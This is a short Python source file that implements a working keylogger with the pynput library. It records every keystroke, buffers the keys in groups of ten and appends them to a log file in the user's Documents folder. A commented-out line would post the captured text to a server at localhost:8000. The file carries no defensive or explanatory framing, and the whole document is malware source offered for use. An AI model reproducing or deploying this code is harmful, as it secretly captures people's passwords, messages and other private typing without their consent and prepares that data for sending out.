from msilib.schema import File
from pynput.keyboard import Listener
import requests, os

class KeyLogger:
    def __init__(self, buffer_size):
        self.data = []
        self.buffer_size = buffer_size
        with Listener(on_press=self.on_pressed, on_release=self.on_release) as l:
            l.join()

    def write(self):
        log_data = "".join(self.data)

        #write the data to local file
        mode = 'w'
        if os.path.isfile(os.path.expanduser('~\documents\log.txt')):
            mode = 'a'

        with open(os.path.expanduser('~\documents\log.txt'), mode) as f:
            f.write(log_data)

        #send data to the internet
        # requests.post("localhost:8000", {'data' : log_data})

    def on_pressed(self, key):
        self.data.append(self.process(key))
        if len(self.data) == self.buffer_size:
            self.write()
            self.data = []

    def on_release(self, key):
        pass

    def process(self, key):
        key = str(key).replace("'", '')
        if key == 'Key.space':
            return ' '
        if 'Key' in key:
            return "\n" + key + '\n'
        return key

if __name__ == "__main__":
    k = KeyLogger(10)